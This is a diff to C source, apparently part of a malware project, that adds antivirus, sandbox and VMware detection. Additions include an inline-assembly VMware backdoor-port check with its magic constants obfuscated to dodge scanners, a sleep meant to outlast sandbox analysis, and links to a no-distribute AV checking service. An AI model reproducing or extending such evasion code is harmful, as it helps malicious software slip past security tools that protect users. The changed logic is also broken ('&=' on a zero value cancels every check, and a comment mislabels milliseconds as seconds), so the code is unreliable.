@@ -1,6 +1,14 @@
 /*
 Function to detect AV and debugger
 Some ideas are from https://www.exploit-db.com/docs/40900.pdf
+some other infos : https://www.exploit-db.com/docs/34591.pdf
+https://www.vmray.com/blog/sandbox-evasion-techniques-part-1/
+
+You may download the instruction set from Intel official web site.
+Instructions from A-M (http://www.intel.com/assets/pdf/manual/253666.pdf)
+Instructions from N-Z (http://www.intel.com/assets/pdf/manual/253667.pdf
+
+AV Check : https://nodistribute.com/result/T4QSP7WbKwyiHB3aedMtvjUY
 */
 
 
@@ -265,13 +273,52 @@ BOOL LoadFakeLibrary(void)
 
 BOOL CheckIfOneCPU(void)
 {
+	BOOL nbcpu = FALSE;
 	// Check if only one CPU is available
 	SYSTEM_INFO SysGuide;
 	GetSystemInfo(&SysGuide);
-	if (SysGuide.dwNumberOfProcessors < 2) return TRUE;
-	else return FALSE;
+	if (SysGuide.dwNumberOfProcessors < 2) 
+		nbcpu = TRUE;
+	else 
+		nbcpu = FALSE;
+	return nbcpu;
 }
 
+BOOL vmware(void)
+{
+	unsigned long _EBX;
+	__try
+	{
+		__asm
+		{
+			// Execute the magic code sequence
+			push ebx
+			mov eax, 0x564D0000
+			mov ah, 0x57		// just a tricky obfuscation
+			mov al, 0x69
+			inc ah
+			dec al
+			mov ebx, 0x42424242 // Ensure 0x564D5868 isn't in EBX :)
+			mov ecx, 10         // The command for obtaining VMWare version information
+			mov dh, 0x55		// just a tricky obfuscation
+			mov dl, 0x59
+			inc dh
+			dec dl
+			in eax, dx
+			mov _EBX, ebx
+			inc ebx
+			pop ebx
+		};
+	}
+	__except (1)
+	{
+		// An exception occured, we ain't in VMWare
+		return false;
+	}
+
+	// The code was executed successfuly, check for the magic value +1
+	return _EBX == 0x564D5869;
+}
 
 /// <summary>
 /// This function try to detect some AV that can detect me
@@ -281,19 +328,26 @@ BOOL noav(BOOL InThread = TRUE)
 	WORD ExitCode = 0;
 
 	// First Check : Examine the time evolution
-	ExitCode += check_time_warp();
+	ExitCode &= check_time_warp();
 
 	// Try to load a non existant DLL
 	if (LoadFakeLibrary() == TRUE) {
 		DEBUGMSG("EXIT_CODE_FAKE_LIBRARY_LOADED");
-		ExitCode += EXIT_CODE_FAKE_LIBRARY_LOADED;
+		ExitCode &= EXIT_CODE_FAKE_LIBRARY_LOADED;
 	}
 
 	// Check if only one CPU is present, so it's a VM
 	if (CheckIfOneCPU() == TRUE)
 	{
 		DEBUGMSG("EXIT_CODE_ONLY_ONE_CPU");
-		ExitCode += EXIT_CODE_ONLY_ONE_CPU;
+		ExitCode &= EXIT_CODE_ONLY_ONE_CPU;
+	}
+
+	// Check if in VMWare
+	if (vmware())
+	{
+		DEBUGMSG("EXIT_CODE_VMWARE");
+		ExitCode &= EXIT_CODE_VMWARE;
 	}
 
 	/* 	This method also exploits the time deadline on each AV scan, we simply allocate
@@ -303,6 +357,7 @@ BOOL noav(BOOL InThread = TRUE)
 		// Allocate a zone of 42Mb of memory, fill it with zero and free it
 		char *MemoryToBeZeroized = NULL;
 		MemoryToBeZeroized = (char *)malloc(ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING * MegaByte); // two time of Answer to the Ultimate Question of Life, the Universe, and Everything
+		Sleep(10123); // wait 10,123 seconds just for fun :-)
 		if (MemoryToBeZeroized != NULL) {
 			memset(MemoryToBeZeroized, ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING, ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING * MegaByte);
 			free(MemoryToBeZeroized);
